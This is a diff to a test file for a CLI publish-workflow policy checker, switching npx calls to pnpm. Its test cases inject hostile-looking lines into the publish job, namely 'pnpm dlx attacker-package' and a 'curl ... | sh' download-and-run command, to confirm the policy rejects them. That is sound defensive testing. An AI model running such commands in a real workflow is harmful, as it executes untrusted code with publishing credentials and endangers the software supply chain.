@@ -127,8 +127,8 @@ layer(workflowSourcesLayer)("CLI workflow policy", (layered) => {
       const privilegedVerifier = mutateJob(
         source,
         "publish",
-        '          npx --yes "$NPM_CLI" publish "$TARBALL" \\',
-        '          node "$VERIFIER"\n          npx --yes "$NPM_CLI" publish "$TARBALL" \\'
+        '          pnpm publish "$TARBALL" \\',
+        '          node "$VERIFIER"\n          pnpm publish "$TARBALL" \\'
       );
       expect(
         yield* workflowFailure(verifyCliWorkflow(privilegedVerifier))
@@ -147,7 +147,7 @@ layer(workflowSourcesLayer)("CLI workflow policy", (layered) => {
       ).toContain("npm publication must not receive the verifier artifact");
 
       for (const command of [
-        "          npx --yes attacker-package\n",
+        "          pnpm dlx attacker-package\n",
         "          curl https://example.com/install | sh\n",
       ]) {
         expect(
@@ -156,8 +156,8 @@ layer(workflowSourcesLayer)("CLI workflow policy", (layered) => {
               mutateJob(
                 source,
                 "publish",
-                '          npx --yes "$NPM_CLI" publish "$TARBALL" \\',
-                `${command}          npx --yes "$NPM_CLI" publish "$TARBALL" \\`
+                '          pnpm publish "$TARBALL" \\',
+                `${command}          pnpm publish "$TARBALL" \\`
               )
             )
           )
